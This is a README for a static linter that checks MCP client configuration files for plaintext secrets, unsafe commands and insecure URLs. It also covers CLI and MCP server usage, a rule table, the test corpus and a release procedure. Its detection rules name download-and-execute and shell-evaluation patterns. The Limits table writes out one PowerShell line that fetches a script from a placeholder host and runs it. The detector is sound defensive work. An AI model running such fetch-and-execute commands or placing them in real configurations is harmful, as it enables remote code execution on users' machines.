# MCP ConfigLint

Offline static checks for MCP client configuration files; flags plaintext secrets, unsafe commands and insecure URLs without starting any server; JSON and SARIF output.

Status: First public release 0.1.0; not yet published to npm or the MCP Registry at the time of writing.

| Item | Value |
| --- | --- |
| npm package | `mcp-configlint` (version `0.1.0`) |
| MCP Registry name | `io.github.strictstack/mcp-configlint` |
| Source code | https://github.com/strictstack/mcp-configlint |
| Issues | https://github.com/strictstack/mcp-configlint/issues |
| Documentation | https://strictstackdocs.tech/mcp-configlint/ |
| Vendor | StrictStack, https://strictstack.tech, support@strictstack.tech |
| License | Apache-2.0 |

The names and URLs above were chosen by the operator and checked as unused (HTTP 404) before publication. They respond only after the operator publishes; ownership is proven at publication time.

The engine reads JSON or JSONC from one explicitly named file or from standard input. It never executes the configured commands, resolves environment variables, contacts URLs or searches for configuration files elsewhere. Values recognised as credentials are redacted in the output. Remediation suggestions are returned as data and are never applied automatically.

Requirements: Node.js 22 or later. There are no runtime dependencies. The portable engine in `src/index.mjs` can also be imported in a browser.

## Usage

### Command line

```sh
npx mcp-configlint <config-file>
npx mcp-configlint --format sarif <config-file> > report.sarif
npx mcp-configlint --format text < <config-file>
npx mcp-configlint --help
```

Synopsis (from `bin/cli.mjs`):

```text
mcp-configlint [--format json|text|sarif] [FILE|-]
mcp-configlint --mcp
```

| Option | Behaviour |
| --- | --- |
| `--format json` | Default. Full result object (findings, summary, disclaimer) as JSON. |
| `--format sarif` | Redacted SARIF 2.1.0 log. |
| `--format text` | One line per finding: severity, rule ID, server name, message. |
| `FILE` or `-` | Input file, read once. `-` or no argument reads standard input. At most one input. |
| `--help`, `-h` | Print usage. |

Input is limited to 64 KiB. The configuration must contain an `mcpServers` or `servers` collection.

Exit codes:

| Code | Meaning |
| --- | --- |
| 0 | No error-severity findings (warnings may be present). |
| 1 | At least one error-severity finding. |
| 2 | Invalid configuration (MCL-001), invalid arguments, unsupported format, input over 64 KiB, or input that could not be read. |

### MCP server mode

```sh
npx mcp-configlint --mcp
# equivalent installed binary:
mcp-configlint-mcp
```

`--mcp` must be the only argument. The server uses the stdio transport. It supports MCP revision `2026-07-28` (per-request metadata: `server/discover`, then `tools/list` and `tools/call`, with `protocolVersion` and `clientCapabilities` in each request's `_meta`) and the `2025-11-25` initialization sequence (`initialize`, `notifications/initialized`, then tool requests).

Tools: `lint_config`, `check_version_pins`, `compare_config`, `explain_rule`, `export_sarif`. All tools are read-only; they receive the configuration as a string or object in the request and never open files.

For a local checkout, configure the client with `node` as the command and the absolute path of `bin/mcp.mjs` in `args`.

Request IDs must not carry secrets. Errors without a readable ID omit `id`, as the MCP schemas of both supported revisions require; errors with a valid ID preserve it. The difference from base JSON-RPC is recorded in [SCHEMA_VALIDATION](docs/SCHEMA_VALIDATION.md).

## Rules

Rule set version `1.0.0` (`src/rules.mjs`). Use `explain_rule` for the full explanation and remediation of each rule.

| Rule | Severity | Check |
| --- | --- | --- |
| MCL-001 | error | Invalid configuration (syntax, shape, size or nesting) |
| MCL-002 | error | Duplicate member or server names |
| MCL-003 | error | Plaintext credential in environment |
| MCL-004 | error | Plaintext credential in arguments |
| MCL-005 | error | Plaintext credential in headers |
| MCL-006 | error | Plaintext credential in URL or query |
| MCL-007 | error | Shell command chaining |
| MCL-008 | error | Download followed by execution |
| MCL-009 | warning | Interpreter code evaluation |
| MCL-010 | warning | Latest version selection |
| MCL-011 | warning | Floating version selection |
| MCL-012 | warning | Missing version pin |
| MCL-013 | warning | Runtime package installation |
| MCL-014 | error | Unencrypted remote transport (HTTP/WS outside loopback) |
| MCL-015 | warning | Literal network address |
| MCL-016 | warning | Private network endpoint |
| MCL-017 | error | Filesystem root scope |
| MCL-018 | warning | Home directory scope |
| MCL-019 | error | Privileged container |
| MCL-020 | warning | Explicit root identity |
| MCL-021 | error | Sensitive host container mount |
| MCL-022 | error | Approve every tool |
| MCL-023 | warning | Full environment forwarding |
| MCL-024 | warning | Remote endpoint without declared authentication |
| MCL-025 | error | Incoming token forwarding |
| MCL-026 | error | TLS verification disabled |
| MCL-027 | warning | Broad network binding |
| MCL-028 | warning | Unrestricted tool access |

### Coverage of the synthetic corpus

The round 3 corpus covers launch wrappers (`env`, `sudo`, `nohup`, `busybox`, `timeout`, `nice`), evaluation through Perl, Ruby and `npx`, redirections in the `command` field, and PowerShell IEX/DownloadString. Round 4 adds `doas`, `xargs`, `flock`, `time`, `unshare`, `command`, `exec`, `su -c` and `script -c`, explicit interpreters after unknown commands, and four PowerShell forms that link download to execution. Variants appear in `command`, in `args` and in both fields combined, plus controls with quoted text, comments, file execution and download without execution. `node scripts/generate-fixtures.mjs` regenerates the synthetic data deterministically without executing its commands.

Review P24 added 20 paired fixtures: PowerShell `-ep bypass -c`, `-W Hidden -c` and `-enc`, `script -qc`, `su -lc`, `tcsh/csh/mksh -c`, `env -S` with text attached to the argument, and interpreters after `npx … --`. The `-enc` payload is not decoded: it produces MCL-009 without any claim about the executed content. The new fixtures are listed in `DATA_PROVENANCE.json` with synthetic origin, generator, size and SHA-256.

The test report contains per-server TP/FP/FN/TN matrices for each corpus and a combined matrix, computed during the tests (harness mode). Rejected configurations are counted separately because they have no analysed servers. The round 4 policy is conservative: it flags explicit sequences such as `sh -c` even when they appear in the arguments of an unknown command, so it may alert when that command only treats the sequence as data. Two round 3 controls were reclassified by this change and their metrics recalculated. Known listing options, script-file boundaries and `--` are respected. These matrices measure only the labelled synthetic cases; precision on real-world configurations is not measured. See [INTERPRETER_MATRIX_ROUND3](docs/INTERPRETER_MATRIX_ROUND3.md) and [ADVERSARIAL](docs/ADVERSARIAL.md).

## Limits

- Static lint findings do not prove the absence of malicious behaviour. This is not a penetration test or a security certification.
- The tool performs no network access and spawns no processes (`src/egress.mjs` contains no network or subprocess implementation). It does not resolve aliases, environment expansion or dynamically constructed code.
- Detection is heuristic; the following known limits can produce false negatives:

| Form | Current limit |
| --- | --- |
| PowerShell `$p = irm https://x.invalid/a.ps1; iex $p` | Values are not propagated between assignments and statements. MCL-008 may be missing even when MCL-007/MCL-009 are reported. Composite pipelines that transform content before `iex` are not guaranteed to be detected. |
| `docker run --entrypoint sh image -c '…'` | The argv produced by the image and entrypoint is not reconstructed; MCL-009/MCL-008 may be missing. Also applies to `--entrypoint=sh`. |

These limits require human review of commands and must not be read as absence of remote execution.

## Development

```sh
npm ci --ignore-scripts
npm test
npm pack --dry-run --ignore-scripts --offline
```

`npm test` runs `node scripts/run-tests.mjs` (harness tests, no dependencies). Each run writes its measurements (including duration, environment and UTC date) outside the repository: to the path in `MIB_TEST_REPORT_LATEST` when set (a path inside the repository is refused with exit 2), otherwise to `TEST_REPORT.latest.json` in a new temporary directory whose path the runner prints on stderr. Running the tests leaves `git status --porcelain --ignored` empty. `TEST_REPORT.json` is the versioned snapshot of the last run in which results changed: counts, cases/files, suites and any other metrics. Only `duracao_s`, `ambiente` and `gerado_em` are excluded from that comparison. If only those three fields differ, the snapshot keeps its original bytes and measurements, and the latest measurement remains in the temporary file. Result changes, including failures, update both files. The runner reports on stderr which file was updated; it does not change or hide the Git state.

The round 4 offline proof installs and calibrates network, DNS, process and write traps before importing the application, analyses the corpus through the APIs and through the in-memory MCP protocol, and checks that private sentinels do not appear in JSON, SARIF or MCP responses. The observed counters are added to the test report automatically (harness mode).

Validation against the official schemas is a separate development check. It requires Python and the optional development tool `jsonschema` (MIT), which is not a runtime dependency:

```sh
python3 scripts/validate_registry.py
python3 scripts/validate_registry.py report.sarif --schema sarif
```

The validator never downloads schemas. [RESEARCH](docs/RESEARCH.md) records the official sources, versions, hashes, retrieval limitations and verification details. [REGISTRY](docs/REGISTRY.md) describes Registry metadata and distribution channels.

### `mcpName`

The MCP Registry verifies ownership of an npm package by matching `package.json#mcpName` with `server.json#name` (source: https://github.com/modelcontextprotocol/registry/blob/main/docs/modelcontextprotocol-io/package-types.mdx, consulted 2026-11-15). Both are set to `io.github.strictstack/mcp-configlint`.

## Publishing (operator only)

Publication is performed only by the operator with a single script:

```sh
bash scripts/publish-public-release.sh [--dry-run | --confirmar] [--env-file <path>] [--help]
```

One-line command for the actual release:

```sh
bash scripts/publish-public-release.sh --confirmar
```

### Options and configuration

- Without a mode the script runs `--dry-run`. Passing both modes, an unknown option, or `--env-file` without a path exits with code 2.
- `.env` is optional and read from the repository root by default (`./.env`, git-ignored). `.env.example` lists the accepted names with `NAO-USAR` values. The file is parsed literally line by line (`NAME=value`) against a closed list of names, without shell expansion; unknown or repeated names, or control characters, exit with code 2.
- Required only with `--confirmar`: `NPM_TOKEN`, `GITHUB_TOKEN`.
- Optional:
  - `CONFIGLINT_CODIGO_URL`: GitHub HTTPS URL override.
  - `CONFIGLINT_MCP_NAME`: Registry name override, either `io.github.<owner>/mcp-configlint` (owner must equal the owner in the GitHub URL) or `tech.strictstack/mcp-configlint`.
  - `CONFIGLINT_GATE_CLI`: path to the clean-room gate CLI; default `../mib-cleanroom-gate/bin/mib-cleanroom-gate.mjs`.
  - `MCP_PRIVATE_KEY`: only for the `tech.strictstack/…` DNS namespace; hex Ed25519 private key, passed to `mcp-publisher` through the environment only.
- Defaults come from `package.json` (`repository.url`, `mcpName`), so `--dry-run` works without `.env` and without credentials. Overrides are applied only to the temporary snapshot that is packed and published, never to the repository; the printed plan states when an override is active. The code pushed to GitHub is always the certified HEAD commit.

### Steps in both modes

1. Validate the configuration and the coherence of the metadata.
2. Scan the versioned tree and the history for secrets and private files.
3. Run the tests in a temporary snapshot of the HEAD files.
4. Run the clean-room gate with `--fase build`. The gate's own requirements apply; the script does not create or certify clean-room receipts.
5. Run `npm pack --offline` twice and require identical SHA-256 digests.
6. Print the plan: the exact external commands, with sensitive values masked.

The dry run writes only to a new directory under `/tmp` (the path is printed), uses no network and does not modify the repository.

### Additional steps with `--confirmar`

Executed in this order; each step is idempotent:

Before any write, every remote state (public GitHub repository, remote `main`, published package, Registry entry) is read first; if any of them diverges the script exits with code 1 and nothing is pushed or published. The snapshot is materialised from the HEAD Git objects (not from the working tree); files flagged assume-unchanged or skip-worktree are refused. The push leaves from a fresh temporary bare repository that contains only the certified HEAD, with `-c core.hooksPath=/dev/null -c http.sslVerify=true -c http.followRedirects=false`, so the repository's own `.git/config` never applies to the authenticated command. `mcp-publisher login dns` reads the key from `MCP_PRIVATE_KEY` when no key flag is given (`resolvePrivateKey` in `cmd/publisher/commands/login.go`, https://github.com/modelcontextprotocol/registry, read 2026-11-15); the existing Registry entry is compared on name, version and package identifiers only.

1. GitHub: an unauthenticated read of `https://api.github.com/repos/<owner>/<repo>` must show an existing public repository; then `git ls-remote`, then `git push <url> <HEAD>:refs/heads/main`. Skipped if the remote `main` already equals HEAD; refused with exit code 1 if it differs.
2. npm: check `https://registry.npmjs.org/mcp-configlint/0.1.0`. Skipped if the published integrity is identical; refused (exit 1) if it differs; otherwise `npm publish <tgz> --access public --ignore-scripts`, with the token only in the child environment.
3. MCP Registry: check the published version. Skipped if identical; refused if different; otherwise `mcp-publisher login github` (the GitHub token is passed as `MCP_GITHUB_TOKEN` in the child environment, never on the command line, so no device-code prompt appears; `mcp-publisher` reads `MCP_GITHUB_TOKEN` when `--token` is absent, per `cmd/publisher/auth/github-at.go` in https://github.com/modelcontextprotocol/registry, read 2026-11-15) or, for `tech.strictstack/…`, `mcp-publisher login dns --domain strictstack.tech` (key via `MCP_PRIVATE_KEY` in the child environment), then `mcp-publisher publish`. The Registry login token is kept in a temporary HOME and deleted afterwards.

Secrets never appear in argv, in output, or in files of the repository or package. Child processes receive a minimal environment. The script sets `umask 077`.

Example and placeholder values (for example `NAO-USAR`, `example`, `changeme`, `placeholder`) are refused under `--confirmar`.

### Exit codes

| Code | Meaning |
| --- | --- |
| 0 | Success. |
| 1 | Verification failure: tests, gate, reproducibility, secret found, remote divergence. |
| 2 | Usage error, or missing, invalid or example configuration. |

### Operator prerequisites

- GitHub organization `strictstack` with an empty public repository `mcp-configlint`.
- A GitHub token with permission to push contents to that repository and with `read:org` (classic PAT) or "Organization permissions → Members → Read-only" (fine-grained). The Registry requires this to grant the organization namespace `io.github.strictstack/*` (source: https://github.com/modelcontextprotocol/registry/blob/main/docs/modelcontextprotocol-io/authentication.mdx, consulted 2026-11-15).
- An npm account with an access token allowed to publish `mcp-configlint`.
- `mcp-publisher` installed on `PATH`.
- For the DNS namespace only: a TXT record on the `strictstack.tech` apex with the value `v=MCPv1; k=ed25519; p=<public key>` (same source).

## License

Apache-2.0. See [LICENSE](LICENSE) and [LICENSES.json](LICENSES.json). The schemas under `schemas/` are used only for development validation and keep their own terms in `schemas/licenses/`.
